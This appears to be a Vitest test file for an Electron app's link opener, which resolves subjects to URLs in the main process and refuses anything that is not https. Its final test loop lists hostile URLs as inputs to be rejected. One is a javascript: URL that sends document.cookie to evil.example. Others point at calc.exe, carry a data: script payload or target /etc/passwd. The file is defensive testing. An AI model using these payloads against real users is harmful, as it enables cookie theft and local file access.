import { describe, expect, it } from 'vitest'
import { linkOpener } from '../src/main/links.js'

/**
 * The gate on `shell.openExternal`.
 *
 * Two claims, and the first is the one that does the work:
 *
 * 1. The renderer cannot name a URL. It names a subject; main resolves it.
 * 2. Whatever comes back is checked again before it reaches the OS.
 *
 * Without (1), (2) is only as good as the scheme check — and a scheme check is a
 * blocklist argument, which is the kind that eventually loses. With (1) there is
 * no argument to attack: the renderer has nowhere to put a URL.
 */

function opener(resolved: { url: string; fellBack: boolean }) {
  const opened: string[] = []
  const dispatched: { operation: string; payload: unknown }[] = []

  const open = linkOpener({
    dispatch: (operation, payload) => {
      dispatched.push({ operation, payload })
      return Promise.resolve(resolved)
    },
    openExternal: (url) => {
      opened.push(url)
      return Promise.resolve()
    },
  })

  return { open, opened, dispatched }
}

describe('opening a row', () => {
  it('resolves the subject through core rather than trusting a URL', async () => {
    const o = opener({ url: 'https://example.atlassian.net/browse/GC-1', fellBack: false })
    await o.open({ subjectKey: 'jira:example/GC-1' })

    expect(o.dispatched).toEqual([
      { operation: 'links.resolve', payload: { subjectKey: 'jira:example/GC-1' } },
    ])
    expect(o.opened).toEqual(['https://example.atlassian.net/browse/GC-1'])
  })

  it('passes the requested target through when there is one', async () => {
    const o = opener({ url: 'https://github.com/o/r', fellBack: true })
    await o.open({ subjectKey: 'repo:github.com/o/r#feature', target: 'repository' })

    expect(o.dispatched[0]?.payload).toEqual({
      subjectKey: 'repo:github.com/o/r#feature',
      target: 'repository',
    })
  })

  it('reports the fallback so the UI can say why it opened something broader', async () => {
    const o = opener({ url: 'https://github.com/o/r', fellBack: true })
    expect(await o.open({ subjectKey: 'repo:github.com/o/r#never-pushed' })).toEqual({
      url: 'https://github.com/o/r',
      fellBack: true,
    })
  })
})

describe('the second check, at the line where a string becomes an OS action', () => {
  // Each of these would be reachable only if core's own check regressed. That is
  // exactly when a second check earns its keep — and the failure it prevents is
  // `shell.openExternal` handing a path to Explorer or a scheme to whatever
  // registered it.
  for (const url of [
    'file:///C:/Windows/System32/calc.exe',
    'javascript:fetch("https://evil.example?"+document.cookie)',
    'http://example.com',
    'data:text/html,<script>alert(1)</script>',
    'vscode://file/etc/passwd',
    'not a url at all',
  ]) {
    it(`refuses ${url.slice(0, 32)}`, async () => {
      const o = opener({ url, fellBack: false })

      await expect(o.open({ subjectKey: 'jira:example/GC-1' })).rejects.toThrow(/non-https/)
      expect(o.opened).toEqual([])
    })
  }
})
